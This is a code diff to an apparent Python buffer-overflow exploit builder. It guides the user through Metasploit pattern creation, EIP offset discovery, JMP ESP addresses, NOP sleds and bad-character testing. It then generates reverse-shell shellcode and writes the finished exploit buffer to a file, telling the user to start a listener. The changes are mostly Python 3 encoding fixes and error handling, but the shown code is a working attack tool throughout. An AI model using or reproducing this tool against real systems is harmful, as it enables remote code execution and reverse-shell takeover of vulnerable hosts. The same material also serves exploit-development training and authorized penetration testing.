@@ -104,7 +104,10 @@ class Classic:
             print(type(self.buffer))
 
         if (sys.version_info >= (3, 0)):
-            self.esp = payload #.encode('latin-1')
+            if not isinstance(payload, str):
+                self.esp = payload.decode('latin-1')
+            else:
+                self.esp = payload
         else:
             self.esp = payload
 
@@ -122,7 +125,8 @@ class Classic:
 
             self.buffer += _nops
 
-        self.buffer += self.esp
+        print(self.buffer, type(self.buffer))
+        self.buffer += self.esp.encode('latin1')
         #self.buffer += "\r\n"
 
         if (self.config.verbose_lv >= 1):
@@ -135,73 +139,71 @@ class Classic:
 
         return self.buffer
 
-    def show_stack(self, config):
-        print("[A * " + str(config.offset) + "]")
-        print(pack('<L', int("0x" + config.jmpesp_add, 16)))
-        print("[" + HexUtil.hex_string_format(self.esp) + "]")
-
     def build_buffer(self):
 
-        filename = System.input("[?] Enter filename to generate :")
+        try :
+            filename = System.input("[?] Enter filename to generate :")
 
-        self.overflow = System.input("[?] How long do you want the pattern? :")
-        print("[+] Generating pattern: msf-pattern_create -l %s" % self.overflow)
+            self.config.overflow = System.input("[?] How long do you want the pattern? :")
+            print("[+] Generating pattern: msf-pattern_create -l %s" % self.config.overflow)
 
-        buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.overflow)]).strip()
+            buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.config.overflow)]).strip()
 
-        System.file_write(filename, buffer)
-        print("[!] Pattern saved to %s" % filename)
+            System.file_write(filename, buffer)
+            print("[!] Pattern saved to %s" % filename)
 
-        eip_address = System.input("[?] Check the target debugger and enter EIP Value :")
+            eip_address = System.input("[?] Check the target debugger and enter EIP Value :")
 
-        _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(eip_address)])
-        _offset = _offset.split('offset ')
+            _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(eip_address)])
+            _offset = _offset.decode('latin-1').split('offset ')
 
-        self.offset = int(_offset[len(_offset) - 1].strip())
+            self.offset = int(_offset[len(_offset) - 1].strip())
 
-        buffer = self.fill_classic(self.offset)
-        System.file_write(filename, buffer)
+            buffer = self.fill_classic(self.offset)
+            System.file_write(filename, buffer)
 
-        print("[+] Buffer is aligned in EIP and saved to %s" % filename)
+            print("[+] Buffer is aligned in EIP and saved to %s" % filename)
 
-        if (self.config.verbose_lv >= 1):
-            print(buffer)
+            if (self.config.verbose_lv >= 1):
+                print(buffer)
 
-        self.jmpesp_add = System.input("[?] Inform JMP ESP address :")
+            self.config.jmpesp_add = System.input("[?] Inform JMP ESP address :")
 
-        try:
-            nops = int(System.input("[?] How many NOPS?"))
-        except:
-            nops = 0
+            try:
+                nops = int(System.input("[?] How many NOPS? [0] :"))
+            except:
+                nops = 0
 
-        gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")
+            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip] :")
 
-        if (gonext == "T"):
-            exploit = self.fill_classic_bytearray(self.offset, self.jmpesp_add)
+            if (gonext == "T"):
+                exploit = self.fill_classic_bytearray(self.offset, self.jmpesp_add)
+                System.file_write(filename, exploit)
+                print("[!] Your buffer is ready at %s" % filename)
+
+            if(gonext != "S"):
+                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas (eg. 1a,40) :")
+
+                if ',' in bads:
+                    _bads = bads.split(',')
+                    for _badchar in _bads:
+                        System.badchars.append(r'\x' + _badchar)
+                elif bads != "":
+                    System.badchars.append(r'\x' + bads)
+
+            self.config.badchars = System.badchars
+
+            shellcode = System.shellcode(self.config)
+            exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops,
+                                                self.config.shellcode)
+
             System.file_write(filename, exploit)
+
+            print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
             print("[!] Your buffer is ready at %s" % filename)
 
-        if (gonext != "S"):
-            bads = System.input("[?] Badchars detected : " + ",".join(
-                System.badchars) + " Additional Badchars? Separate multiple integers by commas")
-
-            if ',' in bads:
-                _bads = bads.split(',')
-                for _badchar in _bads:
-                    System.badchars.append("\\x" + _badchar)
-            elif bads != "":
-                System.badchars.append("\\x" + bads)
-
-        print("[!] Preparing Shellcode for reverse shell.....")
-
-        shellcode = System.shellcode(self.config.localip, self.config.localport, self.config.badchars, self.config.platform)
-        exploit = self.fill_classic_exploit(self.config.offset, self.config.jmpesp_add, self.config.nops, self.config.shellcode)
-
-        System.file_write(filename, exploit)
-
-        print("[!] Spawn listener on " + self.config.localip + ":" + str(self.config.localport))
-        print("[!] Your buffer is ready at %s" % filename)
-
+        except Exception as err:
+            logging.exception(err)
 
     def exploit(self):
         try:
@@ -244,7 +246,7 @@ class Classic:
                     print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to get JMP ESP!!!")
 
                     print("[!] Hint: !mona jmp -r esp -n")
-                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address :")
+                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address (without 0x) :")
 
                     buffer = self.fill_classic_jmp_esp(self.config.offset, self.config.jmpesp_add)
                     gonext = System.input("[!] All set! Press ENTER when your debugger is ready to receive a JMP ESP in EIP :")
@@ -289,7 +291,7 @@ class Classic:
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
 
             if(gonext != "S"):
-                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas :")
+                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas (eg. 1a,40) :")
 
                 if ',' in bads:
                     _bads = bads.split(',')
